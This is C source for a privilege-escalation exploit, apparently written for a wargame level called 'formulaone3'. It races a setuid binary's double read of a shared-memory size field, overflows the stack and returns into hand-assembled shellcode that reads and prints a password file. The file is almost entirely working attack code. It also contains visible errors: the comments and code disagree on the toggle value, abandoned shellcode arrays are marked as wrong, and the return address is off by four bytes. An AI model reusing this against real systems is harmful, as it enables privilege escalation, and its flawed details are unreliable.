/* formulaone3 exploit: double-read race on echo->sz + ret2shm.
   1. create the shm segment (keys[i]) with our content:
        sz field (shm+0) TOGGLES between 10 and 0x2000 by a fast child
        shm+4..: payload that memcpy will smear over the stack:
                 at shm+4+0x110 (= shm+0x114): the saved-EIP slot value
                 = shm_base + SC_OFF (shellcode in the RWX shm)
        shellcode at shm+0x200: open/read/write /etc/formulaone_pass/formulaone3
   2. fork the setuid binary; when memcpy's SECOND load of sz sees 0x2000 it
      smears 1KB of shm over the stack, doecho returns into the shm. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <signal.h>

struct msg { int sz; char ptr[1024]; };

int main(int argc, char **argv) {
    unsigned int shmkey = strtoul(argv[1], 0, 0);
    unsigned int shmaddr = strtoul(argv[2], 0, 0);   /* candidate shm base */
    int sc_off = 0x200;

    int shmid = shmget(shmkey, 8192, IPC_CREAT | 0777);
    if (shmid < 0) { perror("shmget"); return 1; }
    struct msg *m = shmat(shmid, NULL, 0);
    if (m == (void*)-1) { perror("shmat"); return 1; }

    /* payload: fills buf(268B) + shmid + junk + saved-ebp slot, then ret slot */
    memset(m->ptr, 'A', 1024);
    *(unsigned int *)(m->ptr + 0x110) = shmaddr + sc_off;   /* saved EIP slot */
    /* shellcode: open/read/write /etc/formulaone_pass/formulaone3 -> fd 1 */
    unsigned char sc[] = {
      0x31,0xC0,0x50,
      0x68,0x65,0x33,0x32,0x33,        /* push "e323"? wrong - build below */
    };
    /* build shellcode properly: "/etc/formulaone_pass/formulaone3" */
    unsigned char sc2[] = {
      0x31,0xC0,              /* xor eax,eax */
      0x50,                   /* push eax (NUL) */
      0x68,0x33,0x65,0x32,0x33, /* "3e23" hmm wrong order; pushed chunks reversed */
    };
    (void)sc; (void)sc2;
    /* generate at runtime: path chunks pushed in reverse */
    {
        char *path = "/etc/formulaone_pass/formulaone3";
        int len = strlen(path);
        int off = 0;
        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xC0;
        m->ptr[sc_off + off++] = 0x50;                       /* NUL */
        for (int c = len - 4; c >= 0; c -= 4) {              /* push 4-byte chunks */
            m->ptr[sc_off + off++] = 0x68;
            int n = 4; if (c + 4 > len) n = len - c;
            for (int k = 0; k < 4; k++)
                m->ptr[sc_off + off++] = (c + k < len) ? path[c + k] : 0;
        }
        /* pad the tail chunk with NULs on the left (already done above) */
        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE3; /* mov ebx,esp */
        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xC9; /* xor ecx,ecx */
        m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x05; /* mov al,5 */
        m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80; /* open */
        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xC3; /* mov ebx,eax */
        m->ptr[sc_off + off++] = 0x83; m->ptr[sc_off + off++] = 0xEC; /* sub esp,0x40 */
        m->ptr[sc_off + off++] = 0x40;
        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE1; /* mov ecx,esp */
        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xD2; /* xor edx,edx */
        m->ptr[sc_off + off++] = 0xB2; m->ptr[sc_off + off++] = 0x21; /* mov dl,33 */
        m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x03; /* mov al,3 */
        m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80; /* read */
        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xDB; /* xor ebx,ebx */
        m->ptr[sc_off + off++] = 0xB3; m->ptr[sc_off + off++] = 0x01; /* mov bl,1 */
        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE1; /* mov ecx,esp */
        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xC2; /* mov edx,eax */
        m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x04; /* mov al,4 */
        m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80; /* write */
        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xDB; /* xor ebx,ebx */
        m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x01; /* mov al,1 */
        m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80; /* exit */
    }

    pid_t t = fork();
    if (t == 0) {
        /* toggler: flip sz between 10 and 0x2000 forever */
        while (1) { m->sz = 10; m->sz = 0x400; }
    }
    for (int round = 0; round < 400; round++) {
        pid_t p = fork();
        if (p == 0) {
            execl("/formulaone/formulaone3", "formulaone3", "a", (char*)0);
            _exit(127);
        }
        int st = 0;
        waitpid(p, &st, 0);
        /* if the child exited cleanly with output, the parent's stdout has it */
    }
    kill(t, SIGKILL);
    return 0;
}
